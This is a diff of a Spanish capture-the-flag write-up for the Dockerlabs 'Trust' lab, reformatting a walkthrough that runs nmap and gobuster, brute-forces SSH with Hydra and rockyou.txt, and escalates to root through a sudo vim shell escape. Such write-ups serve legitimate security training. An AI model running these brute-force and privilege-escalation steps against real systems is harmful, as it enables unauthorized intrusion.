@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Trust 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Trust ​​
 
-> **Tags:** `Linux` `Web` `Gobuster` `Hydra` `Information Leakage` `Sudoers` 
+## 🖥️ Writeup - Trust
 
-# INSTALACIÓN
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
+
+> **Tags:** `Linux` `Web` `Gobuster` `Hydra` `Information Leakage` `Sudoers`
+
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip trust.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh trust.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 17:08 CEST
 Nmap scan report for 172.17.0.2
@@ -80,7 +89,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
 
 Entramos por el puerto `80` y vemos que solo hay una página por defecto de `Apache2`.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para localizar directorios o archivos ocultos.
 
@@ -89,6 +98,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/d
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -112,11 +122,9 @@ Progress: 541850 / 1543899 (35.10%)`
 
 Encontramos un archivo llamado `secret.php`, al que accedemos desde el navegador.
 
-![alt text](../images/mario.png)
-
 El mensaje que aparece nos hace pensar que podría existir un usuario `mario` en el sistema.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 Asumiendo que existe este usuario, intentamos obtener sus credenciales mediante un ataque de `fuerza bruta` por `SSH`.
 
@@ -125,6 +133,7 @@ hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 60
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -144,15 +153,16 @@ Accedemos por `SSH`.
 ssh mario@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for mario on 81fcf48571ad:
     env_reset, mail_badpass,
@@ -170,6 +180,7 @@ sudo vim -c ':!/bin/sh'
 ```
 
 Info:
+
 ```
 # whoami
 root
